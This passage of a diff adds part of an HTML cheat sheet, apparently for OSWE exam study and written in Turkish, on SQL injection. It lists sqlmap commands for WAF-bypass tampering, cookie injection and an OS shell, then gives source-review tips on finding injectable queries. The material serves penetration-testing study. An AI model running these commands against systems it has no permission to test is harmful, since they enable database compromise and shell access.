+<span class="cmt"># Level ve risk artır</span>
+sqlmap -u <span class="str">"url"</span> --level=<span class="num">5</span> --risk=<span class="num">3</span>
+
+<span class="cmt"># WAF bypass tamper</span>
+sqlmap -u <span class="str">"url"</span> --tamper=space2comment,charencode
+
+<span class="cmt"># Cookie injection</span>
+sqlmap -u <span class="str">"url"</span> --cookie=<span class="str">"id=1"</span> -p id
+
+<span class="cmt"># OS shell</span>
+sqlmap -u <span class="str">"url"</span> --os-shell</div>
+      </div>
+    </div>
+    <div class="grid1">
+      <div class="card">
+        <div class="card-title">OSWE için Kritik Hatırlatmalar <span class="badge badge-red">exam</span></div>
+        <table class="cstable">
+          <tr><th>Konu</th><th>Kilit Nokta</th></tr>
+          <tr><td>Source code review</td><td>SQLi'yi source'dan tespit et: <code>string concat + user input</code> pattern ara, PDO/prepared statement yoksa vuln</td></tr>
+          <tr><td>Whitebox methodology</td><td>Input → sink tracing: tüm user-controlled parametreleri izle, DB'ye ulaşanları işaretle</td></tr>
+          <tr><td>Second-order</td><td>Register → login akışında: kayıt verisinin sonradan sorgulara gittiği noktaları ara</td></tr>
+          <tr><td>ORM güvenmesi</td><td>ORM kullanan kodlar bile raw query içerebilir: <code>Model.where("name = '#{params[:name]}'") </code>Ruby/Rails zaafiyeti</td></tr>
+          <tr><td>Stored proc</td><td>Stored procedure içinde de SQLi olabilir: EXEC ile dynamic SQL oluşturuluyorsa</td></tr>
+          <tr><td>Error handling</td><td>Custom error sayfası = blind olabilir; zaman ve boolean farkını ölç</td></tr>
+          <tr><td>DB link</td><td>MSSQL linked server, Oracle DB Link ile lateral hareket mümkün</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+document.querySelectorAll('.nav-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById(btn.dataset.sec).classList.add('active');
+  });
+});
+
+function cp(btn, id) {
+  const el = document.getElementById(id);
+  const text = el ? el.innerText : '';
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+</script>
+
+</div>
+</body>
+</html>
